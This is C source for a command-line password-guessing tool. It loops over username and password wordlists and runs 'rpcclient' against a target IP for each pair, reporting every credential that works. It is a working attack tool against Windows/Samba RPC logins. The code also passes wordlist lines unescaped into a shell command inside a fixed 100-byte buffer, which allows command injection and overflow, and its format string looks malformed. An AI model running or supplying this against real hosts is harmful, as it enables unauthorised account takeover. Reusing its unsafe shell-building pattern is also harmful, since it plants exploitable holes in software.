#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ARG_USER "-u"
#define ARG_PASSWD "-p"
#define ARG_IP "-i"

void setArgument(char ** variable, char * arg);

int main(int argc, char **argv)
{
    char * user_file_path = NULL;
    char * pass_file_path = NULL;
    char * ip = NULL;

    char command[100];

    for (int i = 1; i < argc; i++) { // i = 1 because the first arg = the name of the exe
        if (argv[i][0] == '-') {
            if (strcmp(ARG_USER, argv[i]) == 0) {
                i++;
                setArgument(&user_file_path, argv[i]);
            }
            else if (strcmp(ARG_PASSWD, argv[i]) == 0) {
                i++;
                setArgument(&pass_file_path, argv[i]);
            }
            else if (strcmp(ARG_IP, argv[i]) == 0) {
                i++;
                setArgument(&ip, argv[i]);
            }
            else {
                printf("Error: argument %s not recognised\n", argv[i]);
                exit(EXIT_FAILURE);
            }
        }
    }


    FILE *pass_fp, *user_fp;
    char *user_line = NULL;
    size_t user_len = 0;
    ssize_t user_read;

    user_fp = fopen(user_file_path, "r");
    if (user_fp == NULL)
        exit(EXIT_FAILURE);

    while ((user_read = getline(&user_line, &user_len, user_fp)) != -1) {
        FILE *pass_fp;
        char *pass_line = NULL;
        size_t pass_len = 0;
        ssize_t pass_read;

        pass_fp = fopen(pass_file_path, "r");
        if (pass_fp == NULL)
            exit(EXIT_FAILURE);

        user_line[strcspn(user_line, "\n")] = 0; // Remove trailing newline
        
        while ((pass_read = getline(&pass_line, &pass_len, pass_fp)) != -1) {
            int output;
            pass_line[strcspn(pass_line, "\n")] = 0; // Remove trailing newline

            sprintf(command, "rpcclient -U \"%s\"%\"%s\" -c \"testme\" %s > /dev/null 2>&1", user_line, pass_line, ip);
            output = system(command);
            if (output == 0) {
                printf("Valid credentials for host %s:\n", ip);
                printf("\tUsername:\t%s\n", user_line);
                printf("\tPassword:\t%s\n", pass_line);
                printf("\n");
            }
        }
    
        if (pass_line)
            free(pass_line);
    
        fclose(pass_fp);
    }

    fclose(user_fp);

    if (user_line)
        free(user_line);

    exit(EXIT_SUCCESS);
}

void setArgument(char ** variable, char * arg) {
    *variable = arg;
}
